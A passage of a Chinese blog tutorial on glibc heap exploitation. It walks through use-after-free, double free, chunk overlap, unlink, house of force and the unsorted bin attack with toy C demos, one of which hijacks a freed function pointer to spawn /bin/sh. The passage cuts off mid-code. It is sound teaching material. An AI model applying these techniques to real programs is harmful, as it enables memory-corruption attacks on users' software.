src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png" alt="image-20201219142302977"></p><p>可以很直观的看到确实是溢出了一个字节</p></blockquote><h2 id="0x02-Use-After-Free"><a href="#0x02-Use-After-Free" class="headerlink" title="0x02 Use After Free"></a>0x02 Use After Free</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>Use After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><h3 id="3-演示-1"><a href="#3-演示-1" class="headerlink" title="3.演示"></a>3.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func_ptr)</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys1</span><span class="params">(<span class="keyword">char</span> command[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span> content[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//申请了4个int大小的内存</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//因为前2个也就是0x10是用来管理chunk的</span></span><br><span class="line">    p1[<span class="number">2</span>]=echo;<span class="comment">//所以从第三个开始</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello again\n"</span>); <span class="comment">//p1指针未被置空,虽然free了,但仍可使用.</span></span><br><span class="line">    func_ptr *p2=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//p2与p1指针指向的内存为同一地址</span></span><br><span class="line">    p2[<span class="number">2</span>]=sys1; <span class="comment">//在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针.</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以看到这个p1和p2的地址是相同的</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png" alt="image-20201219145625345"></p></blockquote><h2 id="0x03-Double-Free"><a href="#0x03-Double-Free" class="headerlink" title="0x03 Double Free"></a>0x03 Double Free</h2><h3 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="1.概念"></a>1.概念</h3><p>Double Free是UAF较为特殊的一种</p><h3 id="2-演示"><a href="#2-演示" class="headerlink" title="2.演示"></a>2.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(d, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4st malloc(9) %p points to %s the first time\n"</span>, d, d);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s the second time\n"</span>, f, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png" alt="image-20201219160532780"></p><p>直接根据输出理解其中的原理 也就是我上面画的这个图</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png" alt="image-20201219160630662"></p></blockquote><h2 id="0x04-overlap"><a href="#0x04-overlap" class="headerlink" title="0x04 overlap"></a>0x04 overlap</h2><h3 id="1-概念-3"><a href="#1-概念-3" class="headerlink" title="1.概念"></a>1.概念</h3><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h3 id="3-演示1（fastbin）"><a href="#3-演示1（fastbin）" class="headerlink" title="3.演示1（fastbin）"></a>3.演示1（fastbin）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//斷點</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接打断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png" alt="image-20201219214608484"></p><p>可以看到分配了两个</p><p>这时我们把p1的size位改变再进行释放，就会进入fastbin中</p><p>继续分配我们就可以把p2的数据改变</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png" alt="image-20201219214801301"></p><p>fastbin如我们所料</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png" alt="image-20201219214832357"></p><p>演示完成 这时我们就可以改变p2的数据</p></blockquote><h3 id="4-演示2（smallbin）"><a href="#4-演示2（smallbin）" class="headerlink" title="4.演示2（smallbin）"></a>4.演示2（smallbin）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png" alt="image-20201219215247031"></p><p>修改size值之后 释放 进入unsortedbin中</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png" alt="image-20201219215357168"></p><p>继续分配</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png" alt="image-20201219215517292"></p><p>我们这样就可以直接修改数据了</p></blockquote><h3 id="5-演示3（向前overlap）"><a href="#5-演示3（向前overlap）" class="headerlink" title="5.演示3（向前overlap）"></a>5.演示3（向前overlap）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png" alt="image-20201219220938551"></p><p>修改指针后</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png" alt="image-20201219221233429"></p><p>此时释放p4  进入unsortedbin中 如果进行分配 那么我们就可以向前overlap</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png" alt="image-20201219221322641"></p><p>我们最后来分配一下</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png" alt="image-20201219221445409"></p></blockquote><h2 id="0x05-unlink"><a href="#0x05-unlink" class="headerlink" title="0x05 unlink"></a>0x05 unlink</h2><h3 id="1-概念-4"><a href="#1-概念-4" class="headerlink" title="1.概念"></a>1.概念</h3><ul><li>双向链表中移除/添加一个chunk时，会发生断链的操作，这个断链的过程就叫做unlink</li><li>注意事项：unlink不发生在fastbin和smallbin中，所以fastbin和smallbin容易产生漏洞</li></ul><h3 id="2-发生场景"><a href="#2-发生场景" class="headerlink" title="2.发生场景"></a>2.发生场景</h3><p><strong>malloc时：</strong></p><ul><li>从恰好大小合适的largebin中获取chunk，发生unlink</li><li>从比malloc要求大的largebin中取chunk，发生unlink</li></ul><p><strong>free时：</strong></p><ul><li>free之后，与前后空闲的chunk进行合并</li></ul><p><strong>malloc consolidate时：</strong></p><ul><li>consolidate时，chunk之间的unlink</li></ul><p><strong>realloc时：</strong></p><ul><li>向前扩展，合并物理相邻高地址空闲chunk</li></ul><h3 id="3-古老的unlink"><a href="#3-古老的unlink" class="headerlink" title="3.古老的unlink"></a>3.古老的unlink</h3><p>其中P为需要释放/添加的chunk</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png" alt="img"></p><p>unlink的代码</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png" alt="image-20200723164353967"></p><blockquote><p>(1)将前一个chunk占用的内存合并到当前chunk;</p><p>(2)修改指向当前chunk的指针，改为指向前一个chunk。</p><p>(3)使用unlink宏，将前一个free chunk从双向循环链表中移除</p></blockquote><p>此例来自ctf-wiki</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png" alt="img"></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><p><strong>以下12和8都是对于32位来说的</strong></p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p>这张图片应该更好理解</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png" alt="image-20200723165236574"></p><h3 id="4-新的unlink"><a href="#4-新的unlink" class="headerlink" title="4.新的unlink"></a>4.新的unlink</h3><p>新版的unlink加入了下面这部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>如果不指向P，那么就出现了问题</p><p>那如何利用呢？</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><h3 id="5-利用条件"><a href="#5-利用条件" class="headerlink" title="5.利用条件"></a>5.利用条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="6-效果"><a href="#6-效果" class="headerlink" title="6.效果"></a>6.效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h2 id="0x06-house-of-force"><a href="#0x06-house-of-force" class="headerlink" title="0x06 house of force"></a>0x06 house of force</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>攻击者通过堆溢出或者其他方式，控制到topchunk的size成员，这样我们就可以使topchunk的地址超出正常的堆段的地址，这样我们就可以控制到超出堆段之外的内存</p><h3 id="2-利用条件-2"><a href="#2-利用条件-2" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>①通过堆溢出或其他方式，控制到topchunk的size成员</li><li>②将topchunk的size成员变为一个非常大的数，这样topchunk就会超出内存中的堆段，从而访问到其他段的内存地址（got表的地址）</li><li>③此时通过malloc申请内存的时候，申请的就是got的内存地址，就可以更改got内存的内容</li></ul><h2 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h2><h3 id="1-概念-5"><a href="#1-概念-5" class="headerlink" title="1.概念"></a>1.概念</h3><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h3 id="2-使用情况"><a href="#2-使用情况" class="headerlink" title="2.使用情况"></a>2.使用情况</h3><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><h3 id="3-原理解释"><a href="#3-原理解释" class="headerlink" title="3.原理解释"></a>3.原理解释</h3><ol><li><p>unsortedbin正常存储freechunk的结构如图所示，此时这个freechunk是我们还可以通过指针操控的（虽然free了但没有置空）<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png" alt="image-20201222212418753"></p></li><li><p>如果在取走堆块之前，我们将unsortedbin中的chunk的bk指针改为我们的target地址，如下图所示：<img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png" alt="image-20201222212555394"></p></li><li><p>此时我们去malloc堆块的时候就会发生如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** victim is free chunk **/</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png" alt="image-20201222213058942"></p><p>在我们移除victim之后就变成了这样。我们的target的fd的内容为malloc_state结构体的unsortedbin链的fd指针了</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png" alt="image-20201222213335526"></p></li></ol><h3 id="4-演示"><a href="#4-演示" class="headerlink" title="4.演示"></a>4.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large "</span></span><br><span class="line">                  <span class="string">"unsigned long value into stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">"In practice, unsorted bin attack is generally prepared for further "</span></span><br><span class="line">      <span class="string">"attacks, such as 